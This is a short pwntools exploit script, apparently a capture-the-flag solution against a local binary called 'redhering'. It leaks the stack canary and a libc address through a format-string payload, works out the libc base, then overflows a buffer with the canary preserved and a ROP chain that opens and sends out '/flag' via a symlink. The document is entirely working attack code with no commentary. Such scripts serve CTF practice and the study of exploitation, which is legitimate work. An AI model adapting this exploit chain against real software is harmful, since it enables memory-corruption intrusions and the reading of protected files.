from pwn import *
import time 
import os

context.arch = 'amd64'

p = process("./redhering")
e = p.elf 
libc = e.libc 
rop = ROP(e) 
offset = 0x38

# get the libc and the canary 
p.recvuntil("dealership\n")
p.sendline("4")
p.recvuntil("Name: \n") 
p.sendline("%11$p|%21$p")
p.recvuntil("dealership\n")
p.sendline("5")
p.recvuntil("No\n")
p.sendline("1")
out = p.recvuntil("\n")[:-1]
canary, leak = int(out.split(b"|")[0],16), int(out.split(b"|")[1],16) 
# __libc_start_main+231  

# parse the libc and calculate 
libc_base = leak - (libc.symbols["__libc_start_main"] + 231) 
print(f"LIBC: {hex(libc_base)}")


# prepare next name set
p.recvuntil("dealership\n") 
p.sendline("4") 
p.recvuntil("Name: \n") 

# create payload 
libc.address = libc_base 
librop = ROP(libc)
h_addr = next(libc.search(b"h\0"))
librop.call("open", [h_addr, 0])
librop.call("sendfile", [1, 3, 0, 1024])

payload = b'A'*(offset-16) 
payload += p64(canary)
payload += b'A'*8
payload += librop.chain() 

os.symlink("/flag","h")
p.sendline(payload) 
print(p.recvall())
os.unlink("h")













